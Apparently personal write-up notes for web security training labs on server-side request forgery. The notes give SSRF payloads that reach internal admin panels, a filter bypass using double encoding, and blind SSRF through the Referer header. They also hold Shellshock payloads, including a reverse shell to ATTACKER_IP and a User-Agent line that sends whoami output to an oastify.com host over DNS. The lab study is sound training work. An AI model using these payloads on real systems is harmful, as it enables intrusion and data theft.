# SSRF

---


## lab 1


- > open product and click check stock
  - > in request you find ``stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=3&storeId=1``
    > change it to ``stockApi=http://localhost/admin&storeId=3``
    > stockApi=http://localhost/admin/delete?username=carlos&storeId=3



---

## lab 2


- > ``http://192.168.0.1:8080/product/stock/check?productId=4&storeId=1``   send it to intruder 182.168.0.``1``
  > found 192.168.0.239   fond it **``404``**
- > http://192.168.0.239:8080/admin
  > http://192.168.0.239:8080/admin/delete?username=carlos




---


## lab 3


<details>
  <summary>Lab: Blind SSRF with out-of-band detection</summary>


## 1. visit product and see the request replace the ``referrer`` to url form `burp colab`

## **`from`**

```http
GET /product?productId=10 HTTP/2
Host: 0aa300db04961214802e3f50008a00aa.web-security-academy.net
Cookie: session=eKWl8nNqg8d0asyLhuim0DQQUKjA74sW
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aa300db04961214802e3f50008a00aa.web-security-academy.net/        <=======
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

```

## **`to`**


```http
GET /product?productId=3 HTTP/2
Host: 0aa300db04961214802e3f50008a00aa.web-security-academy.net
Cookie: session=eKWl8nNqg8d0asyLhuim0DQQUKjA74sW
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://r7zxj0m1snif5tjpw74kq9bh086zuqif.oastify.com/       <======🔁
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

  
</details>




---


## lab 4


- > try to chnge url to ``http://127.0.0.1/admin`` and it blocked
  > try ``http://127.1/`` it work
  > try ``http://127.1/admin`` it blocked again
  > try ``http://127.1/%2561dmin``
  > http://127.1/%2561dmin/delete?username=carlos




---

## lab 5

- > **/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos**
  



---

## lab 6

<details>
  <summary>Lab: Blind SSRF with Shellshock exploitation</summary>


- <details>
     <summary>what is shellshock</summary>


  <img width="814" height="290" alt="image" src="https://github.com/user-attachments/assets/be879c2b-e0e5-4f4c-a262-5441c3b2b0be" />
  
  <img width="820" height="567" alt="image" src="https://github.com/user-attachments/assets/4db4ec56-05a8-4459-94aa-c0f55c08a3af" />
  
  <img width="594" height="213" alt="image" src="https://github.com/user-attachments/assets/a9a081cc-e01c-45ee-b7b4-1ce7375b09cf" />
  
  <img width="744" height="662" alt="image" src="https://github.com/user-attachments/assets/0e30fe04-2829-4ace-8d2b-7f56ce8cea4c" />
  
  <img width="752" height="650" alt="image" src="https://github.com/user-attachments/assets/a139d0e8-c454-4c87-8a9a-6999fefce0cf" />
  
  <img width="734" height="330" alt="image" src="https://github.com/user-attachments/assets/29397434-0dc7-42fa-9ac3-cc3820ea9d2b" />
  
  ```bash
  env x='() { :;}; echo Vulnerable!' bash -c "echo test"
  () { :;}; /bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
  () { :;}; /bin/bash -c "ls -la /var/www"
  () { :;}; echo; echo; /bin/bash -c "echo hacked > /tmp/shellshock.txt"
  
  ```
  

     
  </details>



## 1. visit product and see the request replace the ``referrer`` to url to **`http://192.168.0.1:8080/ `** ```and user-agent``` and send the request to intruder to try form 1 - 255 

## **`from`**

```http
GET /product?productId=2 HTTP/1.1
Host: 0ad100c604c5831d81414e85007e009a.web-security-academy.net
Cookie: session=i7LYj4A0hTFYeLdtj8BOLNIsNVERaKb8
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ad100c604c5831d81414e85007e009a.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive


```


## **`to`**

```http
GET /product?productId=2 HTTP/2
Host: 0ad100c604c5831d81414e85007e009a.web-security-academy.net
Cookie: session=i7LYj4A0hTFYeLdtj8BOLNIsNVERaKb8
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).5agbmepfv1lt87m3zl7ytnev3m9dx5lu.oastify.com  🟠🟠🟠
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.0.1:8080/        🟠🟠🟠
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

```

<img width="1891" height="596" alt="image" src="https://github.com/user-attachments/assets/922e332c-6511-40fa-8567-3bb18b8a2b4b" />

> ## now go to colaborator and pull to see the requests

<img width="1393" height="783" alt="image" src="https://github.com/user-attachments/assets/85de1503-5b79-4573-8752-6e12888c42c7" />



  
</details>





    
